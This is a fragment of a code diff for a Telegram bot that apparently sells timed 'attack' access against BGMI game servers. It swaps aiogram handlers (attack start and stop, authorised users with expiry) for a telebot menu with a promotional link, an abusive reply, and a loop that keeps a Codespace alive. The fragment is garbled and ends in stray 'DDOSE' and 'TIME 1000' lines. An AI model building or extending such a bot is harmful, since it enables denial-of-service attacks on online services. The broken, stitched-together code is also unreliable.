-        return
-    # Rest of the bgmi stop code
-    global attack_process
-    if attack_process is not None:
-        attack_process.terminate()
-        attack_process.wait()
-        attack_process = None
-        await message.answer("🚀Attack stopped.")
+🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚👉 🆔 123456  day 499*
+ 👇👇👇👇*''', parse_mode='Markdown')
+        attack_command(message)
+    elif message.text == "Canary Download💢":
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/patel_ji47/2939*", parse_mode='Markdown')
+    elif message.text == "Contactadmin✔️":
+        bot.reply_to(message, "** DM- @PATELji_47 *", parse_mode='Markdown')
     else:
-        await message.answer("No attack is currently running.")
+        bot.reply_to(message, '''*🤬Laude faltu ungali mat kar PATELji_47
+ Go and talk to 😊Patel ji 
+DM- @PATELji_47
+Patel ji se jakar baat kar 
+DM- @PATELji_47*''', parse_mode='Markdown')
 
-async def main():
-    bot = Bot(token=API_TOKEN)
-    dp = Dispatcher()
-
-    # Register handlers
-    dp.message.register(welcome_user, filters.Command("start"))
-    dp.message.register(bgmi_attack, filters.Command(commands=['patelji']))
-    dp.message.register(broadcast, filters.Command("broadcast"))
-    dp.message.register(bgmi_stop, filters.Command("stop"))
-    dp.message.register(add_user, filters.Command("adduser"))
-    dp.message.register(remove_user, filters.Command("removeuser"))
-    dp.message.register(update_user, filters.Command("updateuser"))
-    dp.message.register(list_users, filters.Command("listuser"))
-    dp.message.register(restart_bot, filters.Command("restart"))
-    dp.message.register(user_info, filters.Command("userinfo"))
-
-    async def remove_expired_users():
-        while True:
-            global AUTHORIZED_USERS
-            for user_id in list(AUTHORIZED_USERS.keys()):
-                user_data = AUTHORIZED_USERS[user_id]
-                if user_data["authorized_until"] < datetime.datetime.now():
-                    del AUTHORIZED_USERS[user_id]
-                    save_authorized_users()
-            await asyncio.sleep(60)
-
-  
-    asyncio.create_task(remove_expired_users())
-
-    
-    await dp.start_polling(bot)
-    
-
-if __name__ == '__main__':
-    asyncio.run(main())
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
+DDOSE ()'1000
+TIME' 1000
+TIME '1000
+TIME' 1000
